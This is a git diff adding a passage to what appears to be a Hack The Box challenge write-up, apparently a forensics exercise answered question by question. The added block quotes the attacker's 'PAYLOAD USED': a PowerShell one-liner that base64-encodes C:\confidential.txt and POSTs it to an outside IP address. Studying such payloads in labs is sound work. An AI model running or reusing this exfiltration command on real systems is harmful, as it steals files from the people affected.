@@ -125,6 +125,12 @@
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a583fa50-dde3-4cf9-91a0-f658bf8f947b)
 
 
+```pwsh
+PAYLOAD USED:
+
+powershell.exe -c "Invoke-WebRequest -uri http://3.6.165.8/ -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(\"C:\confidential.txt\")))"
+```
+
 > 7TH QUESTION --> ANS:
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/208cef87-467d-4ac6-b57d-7fc451e123dd)
